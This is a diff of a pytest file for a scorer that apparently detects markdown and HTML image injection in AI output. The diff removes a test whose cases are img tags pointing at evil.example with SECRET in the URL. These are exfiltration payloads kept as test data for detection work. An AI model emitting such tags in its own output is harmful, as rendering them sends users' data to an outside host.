@@ -89,31 +89,9 @@ async def test_md_shortcut_reference_image_detected(text: str, patch_central_dat
 @pytest.mark.parametrize(
     "text",
     [
-        '<img src="https://evil.example/SECRET/p.png">',
-        "<img src='https://evil.example/p.png?d=SECRET'>",
-        "<img src=https://evil.example/SECRET/p.png>",
-        '<IMG SRC="https://evil.example/SECRET/p.png">',
-        '<img alt="logo" width="1" src="https://evil.example/SECRET/p.png" />',
-        '<img srcset="https://evil.example/SECRET/p.png 2x">',
-    ],
-)
-async def test_html_img_detected(text: str, patch_central_database):
-    scorer = MarkdownInjectionScorer()
-    score = (await scorer.score_text_async(text))[0]
-    assert score.get_value() is True
-
-
-@pytest.mark.parametrize(
-    "text",
-    [
         # A shortcut reference with no matching definition renders as literal text.
         "![logo]",
         "![logo]\n\n[other]: https://example.com/p.png",
-        # Prose that mentions the tag without being one.
-        "Use an img tag with a src attribute to embed a picture.",
-        "<image>",
-        # Lazy-loading attribute that the browser does not fetch by itself.
-        '<img data-src="https://example.com/p.png">',
     ],
 )
 async def test_md_image_lookalikes_not_detected(text: str, patch_central_database):
